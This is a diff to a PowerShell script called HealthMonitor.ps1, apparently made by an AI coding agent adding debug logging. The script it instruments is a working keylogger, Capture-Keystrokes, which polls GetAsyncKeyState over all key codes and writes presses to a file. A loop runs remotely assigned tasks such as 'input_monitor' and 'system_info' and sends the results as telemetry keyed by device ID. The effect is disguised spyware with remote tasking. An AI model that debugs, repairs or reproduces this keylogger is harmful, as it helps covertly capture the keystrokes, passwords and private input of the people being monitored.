@@ -125,12 +125,20 @@ function Capture-Screenshot {
 function Capture-Keystrokes {
     param($duration = 60)
     
+    #region agent log
+    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:125';message='Capture-Keystrokes entry';data=@{duration=$duration}} | ConvertTo-Json -Compress | Add-Content $logPath
+    #endregion
+    
     try {
         # Load required assemblies
         Add-Type -AssemblyName System.Windows.Forms
         
         # Import GetAsyncKeyState API
-        Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
+        $addTypeResult = Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
+        
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H1';location='HealthMonitor.ps1:133';message='Add-Type result';data=@{success=($null -ne $addTypeResult);typeExists=([System.Type]::GetType('User.KeyState') -ne $null)}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
         
         # Clear keylog file
         "" | Out-File $keylogFile -NoNewline
@@ -138,20 +146,57 @@ function Capture-Keystrokes {
         # Calculate end time
         $endTime = (Get-Date).AddSeconds($duration)
         
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H5';location='HealthMonitor.ps1:139';message='Loop start';data=@{endTime=$endTime.ToString('o');currentTime=(Get-Date).ToString('o')}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
+        
+        $loopIterations = 0
+        $keyChecks = 0
+        $exceptionsInLoop = 0
+        
         # Monitor keystrokes until duration expires
         while ((Get-Date) -lt $endTime) {
-            # Check virtual key codes 8-190
-            for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
-                # Check if key is pressed (-32767 means just pressed)
-                if ([User.KeyState]::GetAsyncKeyState($virtualKey) -eq -32767) {
-                    $keyName = [System.Windows.Forms.Keys]$virtualKey
-                    Add-Content $keylogFile "$keyName " -NoNewline
+            $loopIterations++
+            $currentTime = Get-Date
+            
+            #region agent log
+            if ($loopIterations % 100 -eq 0) {
+                @{sessionId='debug-session';runId='run1';hypothesisId='H3,H5';location='HealthMonitor.ps1:142';message='Loop iteration';data=@{iteration=$loopIterations;currentTime=$currentTime.ToString('o');endTime=$endTime.ToString('o');timeRemaining=($endTime - $currentTime).TotalSeconds}} | ConvertTo-Json -Compress | Add-Content $logPath
+            }
+            #endregion
+            
+            try {
+                # Check virtual key codes 8-190
+                for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
+                    $keyChecks++
+                    # Check if key is pressed (-32767 means just pressed)
+                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
+                    if ($keyState -eq -32767) {
+                        $keyName = [System.Windows.Forms.Keys]$virtualKey
+                        try {
+                            Add-Content $keylogFile "$keyName " -NoNewline -ErrorAction Stop
+                        } catch {
+                            #region agent log
+                            @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:148';message='File write error';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
+                            #endregion
+                            $exceptionsInLoop++
+                        }
+                    }
                 }
+            } catch {
+                #region agent log
+                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:144';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
+                #endregion
+                $exceptionsInLoop++
             }
             
             # Sleep 50ms between checks to reduce CPU usage
             Start-Sleep -Milliseconds 50
         }
+        
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H5';location='HealthMonitor.ps1:154';message='Loop exit';data=@{iterations=$loopIterations;keyChecks=$keyChecks;exceptions=$exceptionsInLoop}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
         
         # Read captured keystrokes
         $keystrokeData = Get-Content $keylogFile -Raw -EA SilentlyContinue
@@ -161,17 +206,26 @@ function Capture-Keystrokes {
         
         # Return data
         if ($keystrokeData) {
+            #region agent log
+            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:163';message='Function return success';data=@{dataLength=$keystrokeData.Length}} | ConvertTo-Json -Compress | Add-Content $logPath
+            #endregion
             return @{
                 data_type = "input"
                 data = $keystrokeData
             }
         } else {
+            #region agent log
+            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:169';message='Function return no data';data=@{}} | ConvertTo-Json -Compress | Add-Content $logPath
+            #endregion
             return @{
                 data_type = "input"
                 data = "[No keystrokes recorded]"
             }
         }
     } catch {
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:174';message='Function exception';data=@{error=$_.Exception.Message;stackTrace=$_.ScriptStackTrace}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
         return @{
             data_type = "input"
             data = "Error: $_"
@@ -334,11 +388,17 @@ while ($true) {
                     }
                     
                     "input_monitor" {
+                        #region agent log
+                        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:336';message='Starting input_monitor task';data=@{taskId=$task.id;duration=$duration}} | ConvertTo-Json -Compress | Add-Content $logPath
+                        #endregion
                         $duration = 60
                         if ($task.task_params -and $task.task_params.duration) {
                             $duration = [int]$task.task_params.duration
                         }
                         $taskResult = Capture-Keystrokes -duration $duration
+                        #region agent log
+                        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:341';message='input_monitor task completed';data=@{taskId=$task.id;hasResult=($null -ne $taskResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
+                        #endregion
                     }
                     
                     "system_info" {
@@ -371,6 +431,9 @@ while ($true) {
                 }
                 
                 # Save results to telemetry
+                #region agent log
+                $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H1,H2,H3,H4,H5';location='HealthMonitor.ps1:373';message='Task result check';data=@{taskId=$task.id;hasResult=($null -ne $taskResult);taskType=$task.task_type}} | ConvertTo-Json -Compress | Add-Content $logPath
+                #endregion
                 if ($taskResult) {
                     $telemetryData = @{
                         device_id = $deviceId
